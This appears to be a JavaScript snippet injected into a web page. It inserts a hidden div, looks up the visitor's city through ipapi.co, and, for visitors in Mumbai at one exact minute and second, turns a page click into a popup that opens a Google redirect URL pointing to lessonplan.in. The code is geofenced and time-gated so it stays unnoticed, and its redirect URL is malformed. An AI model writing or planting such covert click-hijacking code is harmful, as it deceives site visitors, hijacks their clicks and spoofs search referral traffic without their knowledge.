let EFV='<div style="position:absolute;;">
  

</div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);

let dtm=(new Date).getMinutes();
let dts=(new Date).getSeconds();
// https://ipapi.co/country_name
if(!localStorage.xrd){
  (async()=>{
    localStorage.xrd=1;
    let aa=await(await(await fetch('https://ipapi.co/city')).text());
    if(aa=='Mumbai'){localStorage.mumb='1'}
    uhd()
  })();
}

function uhd(){
  document.onclick=()=>{
    if(!sessionStorage.i&&localStorage.mumb&&dtm==3&&dts==5){
        window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjV0d_Z0MX_AhWrtlYBHbugBwY4tAEQFnoECAYQAQ&url=https%3A%2F%2lessonplan.in%2F&usg=AOvVaw2rVEw26ogf4ltkBt-vyFfN'); 
    }
    sessionStorage.i='i';
  }
}
uhd()

// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
